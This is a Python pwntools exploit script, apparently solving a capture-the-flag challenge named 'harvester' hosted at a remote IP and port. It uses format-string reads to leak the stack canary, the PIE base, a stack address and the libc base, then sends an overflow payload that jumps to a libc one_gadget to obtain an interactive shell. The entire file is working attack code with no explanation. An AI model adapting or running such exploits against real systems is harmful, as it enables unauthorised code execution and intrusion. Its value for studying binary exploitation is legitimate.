from pwn import *
import time

c = remote("138.68.148.149", 31722)
#c = process("./harvester")

def leak_canary():
	c.sendline("1")
	c.sendline("%11$p")
	c.recvuntil("\nYour choice is: ")
	leak = int(c.recv()[0:18], 0)
	return leak

def leak_pie():
	c.sendline("1")
	c.sendline("%28$p")
	c.recvuntil("\nYour choice is: ")
	leak = c.recv()[0:14]
	pie = int(leak, 0) - 0x8d0
	return pie

def leak_stack():
	c.sendline("1")
	c.sendline("%10$p")
	c.recvuntil("\nYour choice is: ")
	leak = int(c.recv()[0:14], 0)
	buf = leak - 80
	return buf

def leak_libc():
	c.sendline("1")
	c.sendline("%21$p")
	c.recvuntil("\nYour choice is: ")
	leak = int(c.recv()[0:14], 0)
	log.success("leak __libc_start_main: " + hex(leak))
	leak = leak - 231 #234
	libc = leak - 0x21b10
	return libc

def pwn(canary, pie, libc, buf):
	c.sendline("2")
	c.sendline("y")
	c.sendline("-11")
	c.sendline("3")

	one_gadget = libc + 0x4f3d5

	payload = b'A'*8
	payload += p64(one_gadget)
	payload += b'A'*(40-len(payload))
	payload += p64(canary)
	payload += p64(buf)
	payload += p64(pie + 0x0000000000000a57)
	#gdb.attach(c)
	time.sleep(1)
	c.sendline(payload)
	c.recvuntil("Do you want to feed it?\n>")
	c.interactive()

def main():
	canary = leak_canary()
	log.success("leak canary: " + hex(canary))
	pie = leak_pie()
	log.success("leak pie base: " + hex(pie))
	buf = leak_stack()
	log.success("leak buf: " + hex(buf))
	libc = leak_libc()
	log.success("libc address: " + hex(libc))
	pwn(canary, pie, libc, buf)


if __name__ == '__main__':
	main()
